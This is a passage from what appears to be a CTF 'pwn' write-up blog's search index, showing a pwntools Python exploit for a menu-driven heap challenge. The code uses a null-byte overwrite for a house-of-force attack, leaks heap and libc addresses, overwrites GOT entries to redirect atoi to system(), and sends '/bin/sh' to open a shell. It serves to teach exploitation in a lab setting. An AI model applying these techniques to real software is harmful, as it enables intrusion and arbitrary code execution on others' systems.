class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def decorate_room(content):</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;2&quot;)</span><br><span class="line">	p.recvuntil(&quot;Make your room more shining!\n&quot;)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show_house():</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getpid():</span><br><span class="line">	print proc.pidof(p)[0]</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">mmap_topchunkpoint_offset = 6052713</span><br><span class="line">atoi_got = 0x602058</span><br><span class="line">write_got = 0x602018</span><br><span class="line">set_buf_plt = 0x400710</span><br><span class="line"># .bss:00000000006020C0 housed</span><br><span class="line">house_description_addr = 0x00000000006020C0</span><br><span class="line">housen_addr = 0x602100</span><br><span class="line">mmap_system_distance = 2384768</span><br><span class="line"></span><br><span class="line"># use null byte overwrite top chunk point to house of force</span><br><span class="line">init(mmap_topchunkpoint_offset)</span><br><span class="line"></span><br><span class="line"># leak heap addr</span><br><span class="line">show_house()</span><br><span class="line">p.recvuntil(&quot;1&quot; * 0x20)</span><br><span class="line">heap_addr = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;heap_addr = &quot; + hex(heap_addr)</span><br><span class="line">fake_topchunk_addr = heap_addr + 240</span><br><span class="line">print &quot;fake_topchunk_addr = &quot; + hex(fake_topchunk_addr)</span><br><span class="line"></span><br><span class="line"># fake_topchunk_addr + malloc_size = house_description_addr - 0x10</span><br><span class="line">malloc_size = house_description_addr - 0x20 - fake_topchunk_addr </span><br><span class="line"></span><br><span class="line"># 劫持到house_description, 写got表，泄露libc</span><br><span class="line">build_room(malloc_size)</span><br><span class="line">build_room(0x100)</span><br><span class="line">decorate_room(p64(write_got) + p64(atoi_got))</span><br><span class="line">show_house()</span><br><span class="line">p.recvuntil(&quot;And description:\n&quot;)</span><br><span class="line">write_addr = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;write_addr = &quot; + hex(write_addr)</span><br><span class="line"># 计算system和/bin/sh的地址</span><br><span class="line">print &quot;\ncalculating system() addr ... ###&quot;</span><br><span class="line">system_addr = write_addr + (libc.symbols[&apos;system&apos;] - libc.symbols[&apos;write&apos;])</span><br><span class="line">print &quot;system_addr = &quot; + hex(system_addr)</span><br><span class="line"># system_addr = mmap_addr + mmap_system_distance</span><br><span class="line"># print &quot;system_addr = &quot; + hex(system_addr)</span><br><span class="line"></span><br><span class="line"># 覆盖room，写got表</span><br><span class="line">decorate_room(p64(system_addr))</span><br><span class="line">p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
